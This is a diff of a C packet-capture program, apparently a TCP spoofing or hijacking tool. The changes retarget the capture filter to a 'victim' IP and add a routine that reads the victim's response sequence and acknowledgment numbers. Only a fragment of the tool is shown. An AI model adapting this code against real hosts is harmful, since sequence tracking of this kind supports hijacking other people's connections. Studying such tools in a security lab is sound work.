@@ -250,7 +250,7 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 				printf("\t\t\tdst port = %d\n", htons(tcpHeader->th_dport));
 				printf("\t\t\tseq = %d\n", htonl(tcpHeader->th_seq));
 				printf("\t\t\tack = %d\n", htonl(tcpHeader->th_ack));
-			//	memcpy(&tcpHeader->th_ack, htonl(0), 33);
+				//	memcpy(&tcpHeader->th_ack, htonl(0), 33);
 			}
 			else if (ipHeader->ip_p == IP_PROTO_UDP)
 			{
@@ -380,6 +380,7 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 				break;
 			}
 		}
+		getVictimResponse();
 	}
 	if (bsend == 1)
 	{
@@ -506,8 +507,10 @@ void readcfg(char *cfile)
 */
 
 void open_devices(void)
-{	
-	char filter_exp[] = "port 22";
+{
+	char filter_exp[1024];
+	snprintf(filter_exp, sizeof(filter_exp), "ip src %s", ip_new_victim);
+
 	i = intf_open();
 	if (i == NULL)
 	{
@@ -527,11 +530,13 @@ void open_devices(void)
 		perror("eth open error");
 		exit(-1);
 	}
-	if(pcap_compile(e, &filter, filter_exp, 0, ip) == -1){
+	if (pcap_compile(e, &filter, filter_exp, 0, ip) == -1)
+	{
 		perror("bad filter");
 		exit(-1);
 	}
-	if(pcap_setfilter(e, &filter) == -1){
+	if (pcap_setfilter(e, &filter) == -1)
+	{
 		perror("error setting filter");
 		exit(-1);
 	}
@@ -562,4 +567,19 @@ void rmnl(char *s)
 	while (*s != '\n' && *s != '\0')
 		s++;
 	*s = '\0';
+}
+
+void getVictimResponse()
+{
+	struct pcap_pkthdr header; /* The header that pcap gives us */
+	const u_char *packet;	  /* The actual packet */
+	struct tcp_hdr *responseTCPHeader;
+	struct eth_hdr *ethernetHeader;
+	struct ip_hdr *ipHeader;
+
+	packet = pcap_next(e, &header);
+	responseTCPHeader = (struct tcp_hdr *)(packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
+
+	printf("\t\t\tgot response seq = %d\n", htonl(responseTCPHeader->th_seq));
+	printf("\t\t\tgot response ack = %d\n", htonl(responseTCPHeader->th_ack));
 }
